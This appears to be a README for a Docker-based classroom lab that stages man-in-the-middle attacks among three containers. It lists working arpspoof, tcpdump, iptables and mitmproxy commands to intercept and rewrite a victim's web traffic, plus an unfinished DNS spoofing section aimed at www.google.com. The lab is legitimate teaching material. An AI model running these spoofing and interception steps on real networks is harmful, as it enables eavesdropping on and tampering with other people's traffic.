# Man in the Middle Attack Demo using Docker

- Adapted from: [https://github.com/kientuong114/docker-mitm/tree/main](https://github.com/kientuong114/docker-mitm/tree/main)

The tools used are [mitmproxy](http://mitmproxy.org), [arpspoof](https://www.monkey.org/~dugsong/dsniff/) and [Docker](http://www.docker.com)

## Setup

There are 3 containers, Bob (Server), Alice (Client) and Eve (Attacker).

- **Bob**: is hosting an http server, serving the files contained in `server_files`
- **Alice**: is a container with Firefox running on it. To connect to firefox from the host, visit `http://localhost:5800`.
- **Eve**: is a container meant to be used via bash. To run commands, just run `docker exec -it mitm_eve /bin/bash`. This container has the `attacker_files` folder mounted on the container as `/eve`

The three containers are connected together with a docker bridge network called `mitm`.
Firefox didn't work when networks configuration was provided.

## How to run the demo

1. Install Docker, docker-compose, then run `docker-compose up -d`
2. Connect to Alice's Firefox instance and visit `http://bob/`. This should show the actual website served by Bob
3. You may also connect to alice via command line (`docker exec -it alice sh`) and see which MAC address corresponds to Bob's IP address
4. Open 2 instances of bash on Eve's container (or, equivalently, install and use tmux with two splits) (`docker exec -it eve bash`) and run the `dig` command to discover the IPs of Alice and Bob:

```bash
ifconfig eth0 promisc # enable promiscuous mode
sysctl -w net.ipv4.ip_forward=1 # enable IP forwarding
arp -n
ip -s -s neigh flush all # clear ARP cache
apt update && apt install -y dnsutils nmap
nmap -sn 172.18.0.0/24 # discover IPs in the network using ping scan
dig alice
dig bob
ping -c 1 alice
ping -c 1 bob
arp -n
```

5. With this information, now run arspoof twice, once for each bash instance.

In the attacker's Terminal:

```bash
arpspoof -t <alice_ip> -r <bob_ip>
```

Also you could explictly spoof two targets on two Terminals:

```bash
arpspoof -t <alice_ip> <bob_ip>
arpspoof -t <bob_ip> <alice_ip>
```

Verify in Alice's `bash` Terminal that `ip neighbor or arp -n` shows that Bob's IP is now associated to Eve's MAC address, meaning that the ARP spoofing was successful.

### Using netcat and tcpdump to see the traffic

- In Eve/attacker container, run `tcpdump -i eth0 -w mitm.pcap` to capture all the traffic in a pcap file
- In Alice's container, run `nc -l -p 1234 > received_file` to listen on port 1234 and write everything received to a file
- In Bob/server container, run `echo "Hello from Bob" | nc <alice_ip> 1234`
- In Alice/client container, check the contents of `received_file` to see the message from Bob
- In Eve/attacker container, stop tcpdump and open `mitm.pcap` with Wireshark/tcpdump to see the traffic

```bash
tcpdump -r mitm.pcap | grep "Bob"
```

- You should see the message from Bob in cleartext

### Using mitmproxy to modify the traffic

1. From host browser, go to http://localhost:5800 to connect to Alice's Firefox instance. From the internal browser Alice can use browser normally.
2. Now run the `add_iptables_rule.sh` script in the `eve` folder. This will add a rule to `iptables` to forward every packet with destination port 80 to the proxy
3. You may verify that Alice's browser will give an error when reloading the page. This is because Eve is not blocking the packets in iptables and forwarding them to the proxy. Since the proxy is not active yet, the packets are simply dropped.
4. activate the proxy in passive mode:

```bash
mitmproxy -m transparent
```

5. Reload the browser page: the legit page will show again, but mitmproxy will show that the request passed through Eve
6. shut down the proxy and activate it again, this time with the script that modifies the contents of the page:

```bash
mitmproxy -m transparent -s proxy.py
```

7. Reload the browser page: the attacker has changed the contents of the website.
8. To shut down everything use the `del_iptables_rul.sh` script in the `eve` folder to remove the iptables rule and turn off the two arpspoof instances

### Note

- If the browser shows legit content instead of the modified one, make sure clear all the browser cookies, cache and everything from Privacy & Security page and reload the page

## DNS Spoof - Not Working YET

1. Connect to client's firefox browser from system. Open browser on system and go to http://localhost:5800

   - go to google.com from client's firefox and make sure it's a legit domain

2. Create fake DNS hosts file on the attacker's container

   - use server's ip for demo

   ```bash
   dig server
   echo -e '<fake_server_ip>\twww.google.com' > hosts
   dnsspoof -i eth0 -f hosts
   ```

3. Run arpspoof on gateway (usually: _._.0.1) and the client/victim from attacker's machine

   - Connect to the attacker's Terminal, find gateway ip and run aprpsoof

   ```bash
   docker exec -it eve /bin/bash
   arp -n
   dig client
   arpspoof -i eth0 -t <gateway_ip ending with .1> -r <client_ip>
   ```

4. Browse google.com from client firefox again
